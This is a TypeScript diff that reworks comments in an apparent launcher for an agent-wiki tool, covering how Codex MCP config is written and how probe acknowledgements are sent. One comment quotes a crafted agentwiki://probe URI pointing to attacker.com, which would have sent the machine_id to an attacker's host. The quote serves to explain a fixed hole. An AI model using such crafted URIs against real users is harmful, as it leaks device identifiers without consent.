@@ -90,12 +90,9 @@ async function handleRun(uri: string): Promise<void> {
       ".json",
     );
   } else if (manifest.mcp_config_format === "codex_toml") {
-    // Codex reads MCP servers only from ``~/.codex/config.toml`` — no
-    // per-session config-file override. Write the agent-wiki block
-    // directly into that file (marked with sentinel comments; prior
-    // blocks are stripped first). ``writeSecureTmpfile`` is still kept
-    // as a no-op for symmetry with the claude path, in case a future
-    // codex version grows a ``--mcp-config`` flag.
+    // Codex reads MCP servers only from ``~/.codex/config.toml`` —
+    // write the agent-wiki block directly into that file, replacing
+    // any block written by a prior launch.
     writeCodexAgentWikiMcp({ url: mcpUrl, token: exchanged.mcp_token });
     mcpConfigPath = writeSecureTmpfile(
       renderCodexToml({ url: mcpUrl, token: exchanged.mcp_token }),
@@ -187,14 +184,12 @@ async function handleProbeAck(uri: string): Promise<void> {
   const parsed = parseLaunchUri(uri);
   if (parsed.action !== "probe") throw new Error("expected probe action");
 
-  // Helper posts probe-ack to the **pinned** backend endpoint. URI's
-  // ``endpoint`` field carries the wiki page origin (in dev: frontend
-  // dev-server URL; in prod: same as backend). Auto-pairing to the
-  // URI's endpoint when nothing is pinned was a security hole — a
-  // crafted ``agentwiki://probe?endpoint=https://attacker.com`` URI
-  // would otherwise pin the attacker's host and POST the machine_id
-  // there before any user confirmation. Require explicit
-  // ``set-endpoint`` first.
+  // probe-ack POSTs to the pinned backend endpoint only. URI's
+  // ``endpoint`` field carries the wiki origin (frontend in dev, same
+  // host in prod) and is NOT used as the destination — a crafted
+  // ``agentwiki://probe?endpoint=https://attacker.com`` URI would
+  // otherwise pin the attacker's host and ship the machine_id there
+  // before any user confirmation. ``set-endpoint`` must run first.
   const pinned = getPinnedEndpoint();
   if (!pinned) {
     console.error(
